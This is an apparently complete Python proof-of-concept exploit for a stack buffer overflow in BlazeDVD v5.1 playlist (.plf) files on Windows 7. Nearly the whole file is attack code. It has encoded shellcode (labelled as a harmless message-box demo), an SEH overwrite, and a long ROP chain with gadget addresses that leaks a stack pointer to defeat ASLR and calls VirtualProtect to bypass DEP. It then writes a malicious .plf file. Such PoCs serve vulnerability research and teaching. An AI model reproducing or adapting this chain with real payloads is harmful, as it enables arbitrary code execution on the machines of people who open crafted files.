#!/usr/bin/python
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# BlazeDVD v5.1 (.plf) Stack Buffer Overflow PoC exploit - ALSR/DEP bypass on win7
# Author: mr_me - https://net-ninja.net - mr_me[AT]corelan.be - @StevenSeeley
# Download: http://www.blazevideo.com/
# Tested on windows 7 version N - DEP = AlwaysOn 
# Greetz: Corelan Security Team
# http://www.corelan.be:8800/index.php/security/corelan-team-members/ 
# Greetz to ryujin ! :P
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# This PoC demonstates how we can bypass ASLR by stealing a 
# pointer off the stack and calculating the offset.
# Then setup the VirtualProtect() call and execute it to bypass DEP as well.
# All addresses are from ALSR non protected modules with BlazeDVD.
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Script provided 'as is', without any warranty.
# Use for educational purposes only.
# Do not use this code to do anything illegal !
# 
# Note : you are not allowed to edit/modify this code.
# If you do, Corelan cannot be held responsible for any damages this may cause.
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# write-up here: http://net-ninja.net/blog/?p=124

def banner(): 
    print "|------------------------------------------------------------------|" 
    print "|                         __               __                      |" 
    print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |" 
    print "|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |" 
    print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |" 
    print "| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |" 
    print "|                                                                  |"     
    print "|-------------------------------------------------[ EIP Hunters ]--|" 
    print "[+] BlazeDVD v5.1 (plf) Stack Buffer Overflow PoC exploit - ALSR/DEP bypass on win7" 
	
# MessageBoxA - "mr_me defeats ASLR & DEP !"
sc = ("\xbf\x3a\x13\x11\xdd\xd9\xc8\x33\xc9\xb1\x4b\xd9\x74\x24"
"\xf4\x5b\x31\x7b\x14\x83\xeb\xfc\x03\x7b\x10\xd8\xe6\xc8"
"\x36\x87\xd0\x9f\xec\x43\xd3\x8d\x5f\xd1\x25\xfb\xc4\xae"
"\x37\xcb\x8f\xc6\xbb\xa0\xe6\x3a\x4f\xf0\x0e\xc9\x31\xdd"
"\x85\xfb\xf5\x52\x82\x76\xf5\x34\xb3\xa9\x06\x27\xd3\xc2"
"\x95\x8c\x30\x5f\x20\xf1\xb3\x0b\xae\x71\xc5\x59\x3b\xcb"
"\xdd\x16\x66\xec\xdc\xc3\x74\xdb\x97\x98\x4f\xaf\x29\x70"
"\x9e\x50\x18\x4c\x1d\x02\xdf\x8c\xaa\x51\x21\xc3\x5e\x67"
"\x66\x32\x91\x98\x97\x3b\x69\x1b\x4c\xeb\xfb\x3d\x07\xb1"
"\x27\xc3\xf3\x23\xa3\xcf\x48\x20\xe9\xd3\x4f\xdd\x85\xe8"
"\xc4\x20\x72\x79\x9e\x06\x9e\x1b\xdc\xf4\x96\xf2\x36\x71"
"\x43\x8d\x75\xe9\x02\xc0\x77\x05\x48\x35\x1b\x2a\x92\x3a"
"\xad\x91\x69\x7e\xd0\xc1\x90\xf3\xaa\xed\x70\xa6\x5c\x86"
"\x86\xb9\x62\x11\x3d\x4e\xf5\x4d\xd2\x6e\xfa\xe5\x19\x5d"
"\x2a\x91\x35\xd4\x41\x3c\xb4\x9e\xfa\x9a\x32\x16\xe4\xb4"
"\xbd\x7d\xed\xb1\x80\x2e\x56\x69\xa6\x82\x14\xee\xbb\x38"
"\x37\x18\x9d\xbf\x48\x27\x4a\x2d\xef\xf7\xab\xc5\x2f\xa3"
"\xce\x74\x58\x39\x78\x03\xe1\xd5\x29\x8e\x72\x50\xa6\x3c"
"\x14\xf4\x16\xd5\x95\x67\x25\x40\x2b\xac\x41\xd6\x6f\x47"
"\xdb\x04\x07\x47\xfa\x92\xf8\xef\xdc\x66\xbc\xbf\x74\x2b"
"\x6c\x1f\xa3\xdb\xe3\x7f\xea\x48\x6c\x19\x89\x0f\x18\x8d"
"\x34\xf0\x84\x28\xdf\x9d\x36\xed\x72\x6f\x7e\x99\xc1\xab"
"\x9a\x10\x38\x82\x48\x70\xe8\xb4\x3e\x8b\xde\x06\x7f\x23"
"\x20\x3d\x77")

junk = '\x43' * 312
## This is where we land after our stack pivot ##
rop2 = '\xe7\x57\x60\x61' 			# 0x616057E7 : # MOV AX,100 # RETN 
rop2 += '\x41\x41\x41\x41' 			# JUNK
rop2 += '\x9f\xa5\x62\x61' * 73 	# 0x6162A59F : # ADD EAX,20 # POP EBX # RETN
rop2 += '\x44' * (612-len(junk)-len(rop2))

seh = '\xae\x74\x60\x61'			# 0x616074AE : # ADD ESP,408 # RETN 4 
## leak ptr off the stack and calculate the offset for VirtualProtect() ##
rop = '\x9f\xa5\x62\x61' * 62		# 0x6162A59F : # ADD EAX,20 # POP EBX # RETN
rop += '\xf0\x8d\x62\x61' * 2		# 0x61628DF0 : # ADD EAX,0c # RETN
rop += '\xe3\xd8\x01\x64'			# 0x6401D8E3 : # POP EDI # RETN
rop += '\x1b\x10\x10\x64'			# 0x6410101B : # POP ESI # RETN
rop += '\x3b\xf9\x60\x61'			# 0x6160F93B : # MOV EBX,EAX # CALL EDI
rop += '\x74\x0c\x32\x60'			# 0x60320C74 : # SUB EBP,EBX # OR ESI,ESI # RETN
rop += '\x27\x7e\x01\x64'			# 0x64017E27 : # XOR EAX,EAX # RETN
rop += '\xe1\x67\x01\x64'			# 0x640167E1 : # ADD EAX,EBP # RETN 2
rop += '\x4d\xb2\x10\x64'			# 0x6410B24D : # MOV EAX,DWORD PTR DS:[EAX] # RETN
rop += '\x41\x41'					# JUNK --------------------------^^
rop += '\x3e\xa0\x10\x64'			# 0x6410A03E : # MOV EDX,EBX # JMP SHORT NetReg.6410A083 --> # PPR # RETN 10
rop += '\x41\x41\x41\x41'			# JUNK (for the p/p/r)
rop += '\x41\x41\x41\x41'			# JUNK (for the p/p/r)
rop += '\x05\x6c\x02\x64'			# 0x64026C05 : # SUB EAX,EDX # RETN
rop += '\x41\x41\x41\x41'			# JUNK ---------------------------------------------------------------^^
rop += '\x41\x41\x41\x41'			# JUNK
rop += '\x41\x41\x41\x41'			# JUNK
rop += '\x41\x41\x41\x41'			# JUNK
rop += '\x05\x6c\x02\x64' * 14		# 0x64026C05 : # SUB EAX,EDX # RETN
rop += '\x24\x41\x60\x61' * 88		# 0x61604124 : # ADD EAX,20 # RETN 4
rop += '\x41\x41\x41\x41'			# JUNK ------------------------^^
rop += '\x97\x7d\x03\x64' * 6		# 0x64037D97 : # ADD EAX,-2 # RETN

## Setup the VirtualProtect() call ##
rop += '\xa2\x8b\x60\x61'			# 0x61608BA2 : # XCHG EAX,EDX # RETN
rop += '\x27\x7e\x01\x64'			# 0x64017E27 : # XOR EAX,EAX # RETN
rop += '\x59\x9f\x03\x64' * 6		# 0x64039F59 : # ADD EAX,0C # RETN
rop += '\x97\x7d\x03\x64' * 4		# 0x64037D97 : # ADD EAX,-2 # RETN
rop += '\xa2\x8b\x60\x61'			# 0x61608BA2 : # XCHG EAX,EDX # RETN
rop += '\x24\x01\x64\x61'			# 0x61640124 : # XCHG EAX,EBX # RETN
rop += '\x27\x7e\x01\x64'			# 0x64017E27 : # XOR EAX,EAX # RETN

## Calculate shellcode space ##
rop += '\x59\x9f\x03\x64' * 65		# 0x64039F59 : # ADD EAX,0C # RETN
rop += '\x24\x01\x64\x61'			# 0x61640124 : # XCHG EAX,EBX # RETN
rop += '\xe3\xd8\x01\x64'			# 0x6401D8E3 : # POP EDI # RETN
rop += '\x1c\x10\x10\x64'			# 0x6410101C : # RETN (ROP NOP)
rop += '\x7e\xa9\x60\x61'			# 0x6160A97E : # XCHG EAX,EBP # RETN
rop += '\x27\x7e\x01\x64'			# 0x64017E27 : # XOR EAX,EAX # RETN
rop += '\x74\x58\x02\x64'			# 0x64025874 : # PUSH ESP # POP ESI # RETN
rop += '\x60\x8f\x32\x60'			# 0x60328F60 : # MOV EAX,ESI # POP ESI # RETN 4
rop += '\x71\x97\x32\x60'			# 0x60329771 : # CALL EAX # JUNK --^^
rop += '\x59\x9f\x03\x64'			# 0x64039F59 : # ADD EAX,0C # RETN
rop += '\x41\x41\x41\x41'			# JUNK ------------------------------------^^
rop += '\x59\x9f\x03\x64' * 5		# 0x64039F59 : # ADD EAX,0C # RETN
rop += '\xf1\x2a\x10\x64'			# 0x64102AF1 : # POP ECX # RETN
rop += '\x80\xb1\x11\x64'			# 0x6411b180 : # A writeable location from .data
rop += '\x7e\xa9\x60\x61'			# 0x6160A97E : # XCHG EAX,EBP # RETN
rop += '\x07\x40\x63\x61'			# 0x61634007 : # XCHG EAX,ESI # AND EAX,C95E0000 # RETN 0C
rop += '\x31\x08\x62\x61'			# 0x61620831 : # PUSHAD # RETN

nops = "\x90" * 30
exploit = junk + rop2 + seh + rop + nops + sc 
print "[+] cst-blazedvd.pl exploit file created!"
file=open('cst-blazedvd.plf','w')
file.write(exploit)
file.close()